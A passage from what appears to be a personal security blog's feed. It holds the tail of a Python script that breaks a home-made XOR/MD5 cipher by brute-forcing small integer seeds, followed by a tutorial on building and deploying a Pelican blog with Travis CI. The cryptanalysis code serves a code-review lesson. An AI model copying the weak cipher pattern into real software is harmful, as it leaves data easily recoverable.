&lt;span class="code-line"&gt;    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;cipherText&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;key2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;privateKey&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key2&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;brute&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;this is a test in order to break some home made crypto&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;codedText&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;crypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mi"&gt;32001&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;cipherText&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;codedText&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;codedText&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;l&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;]):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;break&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;brute&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="security"></category><category term="security"></category><category term="cryptography"></category><category term="code review"></category></entry><entry><title>Building this blog with travis</title><link href="https://maggick.fr/2017/03/building-this-blog-with-travis.html" rel="alternate"></link><published>2017-03-04T09:30:00+01:00</published><updated>2017-03-04T09:30:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2017-03-04:/2017/03/building-this-blog-with-travis.html</id><summary type="html">&lt;p&gt;Since January this blog is automatically build using &lt;a href="https://travis-ci.org/"&gt;Travis CI&lt;/a&gt;. The
main advantage is to always use the latest version of &lt;a href="https://blog.getpelican.com/"&gt;Pelican&lt;/a&gt; as
&lt;a href="https://travis-ci.org/"&gt;travis CI&lt;/a&gt; always build its environment from scratch. An other
advantage is that I am able to update the site just from my browser for minor
modifications (spell correction for instance).&lt;/p&gt;
</summary><content type="html">&lt;p&gt;Since January this blog is automatically build using &lt;a href="https://travis-ci.org/"&gt;Travis CI&lt;/a&gt;. The
main advantage is to always use the latest version of &lt;a href="https://blog.getpelican.com/"&gt;Pelican&lt;/a&gt; as
&lt;a href="https://travis-ci.org/"&gt;travis CI&lt;/a&gt; always build its environment from scratch. An other
advantage is that I am able to update the site just from my browser for minor
modifications (spell correction for instance).&lt;/p&gt;


&lt;p&gt;Here is the &lt;code&gt;travis.yml&lt;/code&gt; configuration file pass to &lt;a href="https://travis-ci.org/"&gt;Travis CI&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;language: python&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;install:&lt;/span&gt;
&lt;span class="code-line"&gt;  # https://github.com/wummel/linkchecker/issues/649&lt;/span&gt;
&lt;span class="code-line"&gt;  - pip install requests==2.9.1&lt;/span&gt;
&lt;span class="code-line"&gt;  - pip install LinkChecker==9.3&lt;/span&gt;
&lt;span class="code-line"&gt;  - pip install pelican markdown&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  # grab the build theme&lt;/span&gt;
&lt;span class="code-line"&gt;  - git clone -b build https://github.com/maggick/maggner-pelican&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  # grab the pelican plugins&lt;/span&gt;
&lt;span class="code-line"&gt;  - git clone https://github.com/getpelican/pelican-plugins&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  # grab the latest published version in order to not erase rss feed&lt;/span&gt;
&lt;span class="code-line"&gt;  - git clone https://github.com/maggick/maggick.github.io output&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;script:&lt;/span&gt;
&lt;span class="code-line"&gt;  - linkchecker --check-extern ./content&lt;/span&gt;
&lt;span class="code-line"&gt;  - pelican&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;after_success:&lt;/span&gt;
&lt;span class="code-line"&gt;  - cd output&lt;/span&gt;
&lt;span class="code-line"&gt;  - git add ./&lt;/span&gt;
&lt;span class="code-line"&gt;  - git -c user.name=&amp;quot;Travis CI for maggick&amp;quot; -c user.email=&amp;quot;&amp;lt;redacted&amp;gt;@gmail.com&amp;quot; commit -m &amp;#39;Travis update documentation&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;  - git push https://${GH_TOKEN}@github.com/maggick/maggick.github.io.git master&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="declaration"&gt;Declaration&lt;/h2&gt;
&lt;p&gt;Let us break it a bit. First the declaration part:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We do not need the root right so &lt;code&gt;sudo&lt;/code&gt; is not needed. Moreover we use the
python language.&lt;/p&gt;
&lt;h2 id="install"&gt;install&lt;/h2&gt;
&lt;p&gt;The installation part:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;install:&lt;/span&gt;
&lt;span class="code-line"&gt;  # https://github.com/wummel/linkchecker/issues/649&lt;/span&gt;
&lt;span class="code-line"&gt;  - pip install requests==2.9.1&lt;/span&gt;
&lt;span class="code-line"&gt;  - pip install LinkChecker==9.3&lt;/span&gt;
&lt;span class="code-line"&gt;  - pip install pelican markdown&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  # grab the build theme&lt;/span&gt;
&lt;span class="code-line"&gt;  - git clone -b build https://github.com/maggick/maggner-pelican&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  # grab the pelican plugins&lt;/span&gt;
&lt;span class="code-line"&gt;  - git clone https://github.com/getpelican/pelican-plugins&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  # grab the latest published version in order to not erase rss feed&lt;/span&gt;
&lt;span class="code-line"&gt;  - git clone https://github.com/maggick/maggick.github.io output&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We install:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://docs.python-requests.org/en/master/"&gt;request&lt;/a&gt; in version 2.9.1, this is a python library used by pelican&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pypi.python.org/pypi/LinkChecker"&gt;LinkChecker&lt;/a&gt; in version 9.3, this is a tool that will check
   that the link in the different articles give a 200 HTTP response&lt;/li&gt;
&lt;li&gt;&lt;a href="http://getpelican.com/"&gt;pelican&lt;/a&gt; which is used to build the site&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pypi.python.org/pypi/Markdown"&gt;mardkown&lt;/a&gt; because the articles are wrote in markdown&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Then we grab the theme used by the site on the build branch directly on
&lt;a href="https://github.com/maggick/maggner-pelican"&gt;github&lt;/a&gt;, we also download the &lt;a href="https://github.com/getpelican/pelican-plugins"&gt;pelican plugins&lt;/a&gt;.
We need to get the last build of the site in order to not re publish all the
articles in the RSS feed (it happened once when writing this configuration).&lt;/p&gt;
&lt;h2 id="script"&gt;Script&lt;/h2&gt;
&lt;p&gt;The script part is where the magic happen, this part will build the site and
give a red or green status depending of the output of each script. If all of
them exit without error the build is green otherwise the build is red.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;script:&lt;/span&gt;
&lt;span class="code-line"&gt;  - linkchecker --check-extern ./content&lt;/span&gt;
&lt;span class="code-line"&gt;  - pelican&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The script part used &lt;a href="https://pypi.python.org/pypi/LinkChecker"&gt;LinkChecker&lt;/a&gt; on the content directory where
are all articles in the markdown format. This script will test every link on
every file and exit with an error if a link return something else that an HTTP
200 OK.&lt;/p&gt;
&lt;p&gt;Then we use &lt;a href="http://getpelican.com/"&gt;pelican&lt;/a&gt; to build the site. If an error happened during
the build the script will also exit with an error.&lt;/p&gt;
&lt;h2 id="after-success"&gt;After success&lt;/h2&gt;
&lt;p&gt;Finally, after the success of the two script we deploy the site on github pages,
we publish the site on &lt;a href="https://pages.github.com/"&gt;github pages&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;after_success:&lt;/span&gt;
&lt;span class="code-line"&gt;  - cd output&lt;/span&gt;
&lt;span class="code-line"&gt;  - git add ./&lt;/span&gt;
&lt;span class="code-line"&gt;  - git -c user.name=&amp;quot;Travis CI for maggick&amp;quot; -c user.email=&amp;quot;&lt;span class="nt"&gt;&amp;lt;redacted&amp;gt;&lt;/span&gt;@gmail.com&amp;quot; commit -m &amp;#39;Travis update documentation&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;  - git push https://&lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;GH_TOKEN&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt;@github.com/maggick/maggick.github.io.git master&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We go in the &lt;code&gt;output&lt;/code&gt; directory of the build, we add everything for git, we
commit everything using a user crafted for the occasion and my public email
address. The commit message is a generic one. Then we push everything on the
branch &lt;code&gt;master&lt;/code&gt; of the &lt;a href="https://pages.github.com/"&gt;github pages&lt;/a&gt; repository.&lt;/p&gt;
&lt;p&gt;For this last step I was forced to give a write access to all my repositories to
&lt;a href="https://travis-ci.org/"&gt;Travis CI&lt;/a&gt; using the &lt;a href="https://github.com"&gt;github&lt;/a&gt; API. I do not really like
that but as I am monitoring the commit on my own repository I should be able to
detect a hack  or a malicious action of &lt;a href="https://travis-ci.org/"&gt;Travis CI&lt;/a&gt;. The next
step will be to sign all my commit using GPG but I have not find a suitable
